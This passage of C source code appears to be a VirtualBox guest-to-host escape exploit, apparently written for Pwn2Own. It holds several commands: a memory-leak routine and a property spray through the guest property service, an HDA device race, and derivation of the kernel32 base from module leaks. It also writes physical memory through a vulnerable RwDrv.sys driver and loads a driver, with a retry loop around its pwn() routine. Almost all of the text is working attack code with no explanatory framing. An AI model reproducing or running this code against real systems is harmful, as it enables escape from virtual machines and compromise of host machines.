	hda_init();
	find_good_hda();
	start_flipper();

	leak_modules();
	alloc_payload();

	//uint64_t test = leak(VBoxC);
	//printf("leak=%p\n", test);
	//exit(0);

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
	kernel32 = read_mem(VBoxC + offset_VBoxC_imp_DisableThreadLibraryCalls) - offset_k32_DisableThreadLibraryCalls;
	//kernel32 = 0x414141414141ull;
	printf("kernel32 @ %p\n", kernel32);
	//exit(0);
	for (int i = 0; i < 20; ++i) {
		pwn();
		printf("Retrying...\n");
	}

	return 0;
}

int cmd_read(int argc, char** argv) {
	set_affinity(0);
	printf("Main thread running on CPU %d\n", GetCurrentProcessorNumber());

	client = hgcm_connect("VBoxGuestPropSvc");

	hda_init();
	find_good_hda();
	start_flipper();

	uint64_t start = 0x7fffffb7e000;
	for (;;) {
		uint64_t res = read_mem(start);
		printf("%p: %p\n", start, res);
		char* dat = (char*)res;
		if (dat[0] == 'M' && dat[1] == 'Z') {
			printf("YES %p\n", start);
			return 0;
		}
		start -= 0x1000;
	}
	return 0;
}


int cmd_leak(int argc, char** argv) {
	if (argc < 1) {
		fprintf(stderr, "Usage: leak allocsize [reqsize [words]]\n");
		return 1;
	}
	uint32_t client = hgcm_connect("VBoxGuestPropSvc");
#if 0
	char* buf = (char*)alloc32(0x1000);
	strcpy(buf, "a");
	del_prop(client, buf, 0x1000);
	return 0;
#endif

	int alloc_size = atoi(argv[0]);
	int reqsize = 0;
	int leak_words = 0x10;
	if (argc > 1)
		reqsize = atoi(argv[1]);
	if (argc > 2)
		leak_words = atoi(argv[2]);

	uint64_t* out = (uint64_t*)malloc(8 * leak_words);
	int res = 0;
	int cnt = 0;
	while (!res) {
		cnt += 1;
		res = leak(client, reqsize, alloc_size, sizeof(uint64_t)*leak_words, (char*)out);
	}

	printf("took %d tries \n", cnt);
	if (res) {
		for (int i = 0; i < leak_words; ++i) {
			printf("%llx ", out[i]);
			for (int j = 0; j < 8; ++j) {
				int c = *((unsigned char*)(out + i) + j);
				if (c >= 0x20 && c < 0x80)
					printf("%c", c);
				else
					printf(".");
			}
			printf("\n");
		}
	}
	return 0;
}

int cmd_setprop(int argc, char** argv) {
	if (argc != 2) {
		fprintf(stderr, "Usage: setprop key value\n");
		return 1;
	}
	
	assert(strlen(argv[0]) < 0x1000);
	assert(strlen(argv[1]) < 0x1000);
	char* key = (char*)alloc32(0x1000);
	strcpy(key, argv[0]);
	char* val = (char*)alloc32(0x1000);
	strcpy(val, argv[1]);

	uint32_t client = hgcm_connect("VBoxGuestPropSvc");

	set_prop(client, key, strlen(key) + 1, val, strlen(val) + 1);
	strcpy(val, "XXX");
	get_prop(client, key, strlen(key) + 1, val, 0x1000);
	printf("set property %s = %s\n", key, val);
	//hgcm_disconnect(client);
	return 0;
}

int cmd_setprops(int argc, char** argv) {
	if (argc != 3) {
		fprintf(stderr, "Usage: setprops prefix from to\n");
		return 1;
	}

	uint32_t client = hgcm_connect("VBoxGuestPropSvc");

	const char* prefix = argv[0];
	char* key = (char*)alloc32(100);
	char* val = (char*)alloc32(100);
	strcpy(val, "a");

	int from = atoi(argv[1]);
	int to = atoi(argv[2]);
	for (int i = from; i < to; ++i) {
		sprintf(key, "%s-%d", prefix, i);
		set_prop(client, key, strlen(key) + 1, val, strlen(val) + 1);
		del_prop(client, key, strlen(key) + 1);
	}
	return 0;
}

int cmd_delprops(int argc, char** argv) {
	if (argc != 3) {
		fprintf(stderr, "Usage: delprops prefix from to\n");
		return 1;
	}

	uint32_t client = hgcm_connect("VBoxGuestPropSvc");

	const char* prefix = argv[0];
	char* key = (char*)alloc32(100);
	char* val = (char*)alloc32(100);
	strcpy(val, "a");

	int from = atoi(argv[1]);
	int to = atoi(argv[2]);
	for (int i = from; i < to; ++i) {
		sprintf(key, "%s-%d", prefix, i);
		del_prop(client, key, strlen(key) + 1);
	}
	return 0;
}


int cmd_porttest(int argc, char** argv) {
	uint32_t val = 0x41414141;
	assert(uefi_expl_phys_mem_write(0xf0800000, 4, (unsigned char*)&val, U32));
	//DirectIO_WritePort(0x41414141, 0xd020, 3);
	return 0;
}

int cmd_loaddriver(int argc, char** argv) {
	load_driver("pwn2own.sys", "pwn2own");
	return 0;
}

int main(int argc, char** argv) {
	if (argc < 2) {
		fprintf(stderr, "Usage: %s cmd [args]\n", argv[0]);
		return 1;
	}

	assert(uefi_expl_init("RwDrv.sys", false));
	init();
	guest_info();

	if (!strcmp(argv[1], "leak"))
		return cmd_leak(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "setprop"))
		return cmd_setprop(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "setprops"))
		return cmd_setprops(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "hda"))
		return cmd_hda(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "sploit1"))
		return cmd_sploit1(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "porttest"))
		return cmd_porttest(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "hda2"))
		return cmd_hda2(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "loaddriver"))
		return cmd_loaddriver(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "delprops"))
		return cmd_delprops(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "read"))
		return cmd_read(argc - 2, argv + 2);

#if 0
	if (!strcmp(argv[1], "spray"))
		return cmd_props_spray(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "waitprop"))
		return cmd_waitprop(argc - 2, argv + 2);
	else if (!strcmp(argv[1], "setprops"))
		return cmd_setprops(argc - 2, argv + 2);
#endif
	else {
		fprintf(stderr, "Usage: %s cmd [args]\n", argv[0]);
		return 1;
	}


    return 0;
}

